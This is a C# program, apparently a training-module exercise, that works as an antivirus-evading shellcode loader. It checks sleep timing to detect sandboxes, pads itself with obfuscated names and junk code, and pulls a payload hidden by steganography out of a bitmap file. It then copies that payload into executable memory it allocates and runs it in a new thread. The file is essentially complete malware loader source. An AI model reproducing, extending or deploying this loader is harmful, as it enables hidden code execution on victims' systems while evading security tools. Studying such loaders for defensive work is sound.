using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Drawing;

namespace Module6
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static int times = 4;

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        public static void Main(string[] args)
        {

            System.Console.WriteLine("Hello!");
            short redstone_repeater = 0;
            plop:
            // Dealing with HBD
            DateTime Gn2dlpm1ns = DateTime.Now;
            String heho = "asoduofhoquehfqoudhoasdquwdhouhd102e8u912yd97hdwoauhsdohj109278h2197hd";
            heho += "22 ++";
            int nw4lbzWOgg = 1;
            while (true)
            {
                Sleep(100);
                System.Console.WriteLine("Hello World!");
                nw4lbzWOgg += 1;
                if (nw4lbzWOgg == 21)
                {
                    break;
                }
                heho += Convert.ToString(Math.Cos(nw4lbzWOgg));
            }
            System.Console.WriteLine("Hello!2");
            if (DateTime.Now.Subtract(Gn2dlpm1ns).TotalSeconds > 0.5)
            {
                if (heho.Equals("poop"))
                {
                    return;
                } else if (DateTime.Now.Subtract(Gn2dlpm1ns).TotalSeconds < 1.5)
                {
                    return;
                } else
                {
                    heho = "Didn't return. Java.";
                }
            }

            redstone_repeater++;

            int ESRgZW9Rqn = StegHelper.lll;
            byte[] luhmao = new byte[ESRgZW9Rqn];
            string asdohuag = System.IO.Directory.GetCurrentDirectory();
            System.Console.WriteLine(asdohuag);
            Bitmap blissEnc = new Bitmap(asdohuag + "\\bliss_enc.bmp", false);
            luhmao = StegHelper.extract(blissEnc);

            // Dealing with SBD
            //luhmao = ecksore(luhmao);

            IntPtr qgtjErNvQl = IntPtr.Zero;
            if (redstone_repeater >= times)
            {
                qgtjErNvQl = VirtualAllocEx(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40);
                System.Console.WriteLine("Alloc");
            }
            if (qgtjErNvQl != null)  // etc
            {
                if (redstone_repeater < times)
                {
                    goto plop;
                }
                System.Console.WriteLine("Copy");
                Marshal.Copy(
                    luhmao, 
                    0, 
                    qgtjErNvQl, 
                    ESRgZW9Rqn
                );
                IntPtr threadyToDie = CreateThread(IntPtr.Zero, 0, qgtjErNvQl, IntPtr.Zero, 0, IntPtr.Zero);
                float x = 5;
                float xhalf = 0.5f * x;
                int i = BitConverter.ToInt32(BitConverter.GetBytes(x), 0);
                i = 0x5f3759df - (i >> 1);
                System.Console.WriteLine("Waiting (ideally)");
                WaitForSingleObject(threadyToDie, 0xFFFFFF);
                x = BitConverter.ToSingle(BitConverter.GetBytes(i), 0);
                x = x * (1.5f - xhalf * x * x);
            }

        }
    }
}
